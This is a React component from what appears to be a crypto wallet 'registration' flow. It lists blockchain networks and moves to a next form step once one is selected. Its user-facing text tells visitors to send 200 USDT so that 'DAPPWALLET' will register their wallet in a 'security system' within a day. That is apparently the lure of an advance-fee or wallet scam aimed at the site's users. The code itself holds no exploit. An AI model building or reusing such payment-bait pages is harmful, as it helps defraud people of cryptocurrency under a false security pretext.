import React, { useState } from "react";
import { blockchainNetwork } from "../data/data";
import FormFourList from "./FormFourList";
import FormFive from "./FormFive";

const FormFour = () => {
  const [selectedNetwork, setSelectedNetwork] = useState(null);

  const handleSelection = (wallet) => {
    setSelectedNetwork((curr) =>
      curr?.blockchainNetwork === wallet.blockchainNetwork ? "" : wallet
    );
  };

  return (
    <>
      {selectedNetwork ? (
        <FormFive selectedNetwork={selectedNetwork} />
      ) : (
        <div>
          <p className="mb-[1rem] text-center text-[#121212] text-[0.8rem]">
            Select a wallet from the list and send 200 USDT. After confirming
            the deposit, DAPPWALLET will manage the process automatically within
            1 day, registering your wallet in our security system.
          </p>
          <div className="flex flex-col gap-[0.5rem]">
            {blockchainNetwork.map((network, i) => (
              <FormFourList
                key={network.blockchainNetwork}
                network={network}
                num={i}
                selectedNetwork={selectedNetwork}
                onSelection={handleSelection}
              />
            ))}
          </div>
        </div>
      )}
    </>
  );
};

export default FormFour;
